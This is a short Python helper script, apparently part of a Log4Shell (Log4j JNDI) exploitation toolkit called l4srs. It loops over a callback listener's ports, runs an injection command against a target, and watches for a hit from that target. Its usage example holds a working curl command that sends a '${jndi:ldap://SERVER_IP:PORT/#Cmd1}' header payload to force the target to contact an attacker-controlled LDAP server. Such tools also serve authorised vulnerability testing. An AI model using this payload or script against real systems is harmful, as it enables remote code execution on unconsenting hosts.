import sys
import json
import threading
import subprocess
import time
import os

def is_a_match(line, target_ip):
    try:
        js = json.loads(line)
        return js['port'] > 0 and js['from'] == target_ip
    except Exception :
        return False

def exit(msg=""):
    print(msg)
    print("CTRl C to kill l4srs")

    try:
        os._exit(0)
    except Exception:
        sys.exit()


def send_requests(ports, server_ip, target_ip, cmd_line):
    for port in ports:
        #cl = list(map(lambda s: f'{s}', cmd_line))
        cl = list(map(lambda s: f'{s}'.replace("PORT", port).replace("SERVER_IP", server_ip).replace("TARGET_IP", target_ip), cmd_line))
        try:
            print(f'About to run : {cl}')
            subprocess.run(cl, stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL, timeout=2)
            time.sleep(1000)
        except Exception:
            #pass
            print("timedout...")
    print("tried all ports....sleeping 5 seconds")
    time.sleep(5000)
    exit()

def run(target_ip, cmd_line):
    ports = None
    server_ip = None
    for line in sys.stdin:
        if line.startswith("Address base : "):
            server_ip = line.split(":")[1].strip()
        if line.startswith("Running on : ") :
            ports = line.split(":")[1].strip().split(",")
            break

    if ports is None :
        exit("Unexpected stdin inputs ... exiting")

    print(f'Target IP : {target_ip}')
    print(f'Server IP : {server_ip}')
    print(f'Ports     : {ports}')
    print()
    t = threading.Thread(target=send_requests, args=(ports, server_ip, target_ip, cmd_line))
    t.start()

    for line in sys.stdin:
        print(line.strip())
        if is_a_match(line, target_ip) :
            print("***** We have a hit : "+line);
            exit()

def main():
    if len(sys.argv) < 3:
        print(f'Usage {sys.argv[0]} <target_ip> <command>')
        print(f'Note the 3 vars are PORT, SERVER_IP, TARGET_IP')
        print("example : l4srs run --pC20 | python test_ports.py 1.2.3.4 curl -H 'log_me: ${jndi:ldap://SERVER_IP:PORT/#Cmd1}' http://TARGET_IP:8888/")
        sys.exit(-1)

    run(sys.argv[1], sys.argv[2:])

if __name__ == "__main__" :
    main()
